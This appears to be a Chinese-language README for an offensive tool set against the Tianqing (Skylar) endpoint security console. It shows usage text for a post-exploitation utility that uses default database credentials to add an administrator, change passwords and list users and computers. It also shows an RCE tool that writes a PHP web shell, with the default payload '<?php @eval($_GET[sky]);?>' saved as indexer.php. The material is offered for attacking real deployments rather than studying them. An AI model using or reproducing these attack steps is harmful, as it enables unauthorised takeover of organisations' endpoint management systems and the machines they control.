"# Tianqing_Rce"  

Tianqing在拿到shell之后添加管理员，然后可以查询计算机列表。
```
  -P int
        database port (default 5360)
  -add
        Add manage account
  -d string
        database dbname (default "skylar")
  -h string
        database address (default "127.0.0.1")
  -id string
         the user id (default "5")
  -p string
        database password (default "postgres")
  -pass string
        Add user password (默认密码Admin12345) (default "a71a36a92c71ba476faa632b812bf636")
  -qcomputers
        query qax skylar Computer Lists
  -qusers
        query qax skylar UserLists
  -u string
        database username (default "postgres")
  -update
        Change the password of the account
  -user string
        Add user username (default "test")
```

天擎因为路径不可控，所以收集了挺多路径然后先发包然后请求shell路径
```
Usage of Tianqing_shell_Windows_64.exe:
  -content string
        content 注意双引号要写反斜杠 (default "<?php @eval($_GET[sky]);?>")
  -h    Show help message
  -shell string
        shell name (default "indexer.php")
  -url string
        base url (default "http://localhost:8080")
```
